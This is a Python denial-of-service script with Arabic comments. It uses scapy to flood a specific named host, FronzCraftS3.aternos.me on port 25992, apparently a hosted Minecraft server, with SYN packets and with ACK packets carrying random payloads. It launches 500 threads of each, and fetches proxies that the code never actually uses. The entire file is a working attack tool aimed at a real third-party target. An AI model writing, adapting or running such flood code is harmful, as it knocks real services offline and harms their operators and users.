import threading
from scapy.all import *
import random
import time
import json
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# إعدادات الخادم المستهدف
target_ip = "FronzCraftS3.aternos.me"
target_port = 25992

# تحميل البروكسيات من ملف JSON
with open('Mejo.json', 'r') as file:
    data = json.load(file)

proxies = []

# استخراج الروابط الخاصة بالبروكسيات
for proxy in data['Proxies']:
    proxies.append(proxy['url'])

# دالة لتحميل البروكسيات
def get_proxy():
    proxy_url = random.choice(proxies)
    try:
        # جلب البروكسيات من URL
        response = requests.get(proxy_url, timeout=5)
        proxy_list = response.text.splitlines()
        if proxy_list:
            return random.choice(proxy_list)  # اختيار بروكسي عشوائي
    except requests.exceptions.RequestException as e:
        print(f"فشل في تحميل البروكسيات من {proxy_url}: {e}")
    return None

# دالة الهجوم باستخدام SYN Flood
def syn_flood():
    while True:
        proxy = get_proxy()  # جلب بروكسي عشوائي
        if proxy:
            ip = IP(dst=target_ip)
            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")  # إرسال حزمة SYN
            packet = ip / tcp
            send(packet, verbose=False)  # لا نحتاج إلى iface هنا لأنه لا يعمل مع البروكسيات في Scapy

# دالة الهجوم باستخدام TCP Flood
def tcp_flood():
    while True:
        proxy = get_proxy()  # جلب بروكسي عشوائي
        if proxy:
            ip = IP(dst=target_ip)
            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="A")  # إرسال حزمة TCP مع ACK
            payload = random._urandom(1024)  # إرسال بيانات عشوائية 1KB
            packet = ip / tcp / payload
            send(packet, verbose=False)  # لا نحتاج إلى iface هنا لأنه لا يعمل مع البروكسيات في Scapy

# بدء 500 خيط للهجوم باستخدام SYN Flood
for i in range(500):  # يمكن زيادة العدد حسب الموارد المتاحة
    thread = threading.Thread(target=syn_flood)
    thread.start()

# بدء 500 خيط للهجوم باستخدام TCP Flood
for i in range(500):  # يمكن زيادة العدد حسب الموارد المتاحة
    thread = threading.Thread(target=tcp_flood)
    thread.start()